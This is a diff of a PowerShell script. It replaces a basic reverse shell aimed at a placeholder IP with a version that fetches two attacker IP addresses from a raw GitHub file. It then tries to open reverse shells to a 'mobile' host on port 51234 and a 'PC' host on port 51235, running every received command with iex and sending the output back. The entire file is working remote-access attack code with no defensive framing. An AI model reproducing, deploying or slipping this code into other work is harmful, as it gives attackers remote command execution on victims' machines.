@@ -1,12 +1,40 @@
-$client = New-Object System.Net.Sockets.TCPClient('X.X.X.X',51234);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-};
-$client.Close()
+# Fetch the IPs from the GitHub link
+$uri = 'https://raw.githubusercontent.com/X3D4L/pastebin/refs/heads/main/.dat/ip'
+$content = Invoke-RestMethod -Uri $uri
+
+# Extract IPs
+$mobileIP = ($content -split 'm=')[1].Split('=')[0].Trim()
+$pcIP = ($content -split 'p=')[1].Split('=')[0].Trim()
+
+# Ports for each connection
+$mobilePort = 51234        # Port for mobile connection
+$pcPort = 51235            # Port for PC connection
+
+# Function to create reverse shell
+function Start-ReverseShell($ip, $port) {
+    $client = New-Object System.Net.Sockets.TCPClient($ip, $port);
+    $stream = $client.GetStream();
+    [byte[]]$bytes = 0..65535|%{0};
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+        $sendback = (iex $data 2>&1 | Out-String );
+        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+        $stream.Write($sendbyte,0,$sendbyte.Length);
+        $stream.Flush()
+    };
+    $client.Close()
+}
+
+# Try connecting to both IPs
+try {
+    Start-ReverseShell($mobileIP, $mobilePort)
+} catch {
+    Write-Host "Could not connect to mobile IP: $mobileIP"
+}
+
+try {
+    Start-ReverseShell($pcIP, $pcPort)
+} catch {
+    Write-Host "Could not connect to PC IP: $pcIP"
+}
